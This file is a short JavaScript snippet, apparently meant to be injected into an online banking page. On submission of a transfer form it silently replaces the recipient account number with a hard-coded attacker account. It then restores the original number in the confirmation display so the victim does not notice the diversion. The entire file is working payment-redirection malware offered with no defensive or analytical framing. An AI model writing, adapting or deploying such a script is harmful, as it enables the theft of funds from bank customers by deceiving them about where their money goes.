(function () {
    const fakeAccount = "66666666666666666666666666";
    console.log("scipt loaded");

    document.addEventListener("DOMContentLoaded", () => {
        const form = document.getElementById("transfer-form");
        const accountInput = document.getElementById("account-number");

        if (!form || !accountInput) return;

        console.log("-");

        form.addEventListener("submit", (event) => {
            event.preventDefault();

            const originalAccount = accountInput.value;
            console.log(`original account: ${originalAccount}`);


            accountInput.value = fakeAccount;
            console.log(`faked one: ${fakeAccount}`);


            document.getElementById("conf-account-number").textContent = fakeAccount;


            const interval = setInterval(() => {
                const confirmField = document.getElementById("conf-account-number");
                if (confirmField && confirmField.textContent === fakeAccount) {
                    confirmField.textContent = originalAccount;
                    clearInterval(interval);
                    console.log("completed.");

                }
            }, 50);
        });
    });
})();
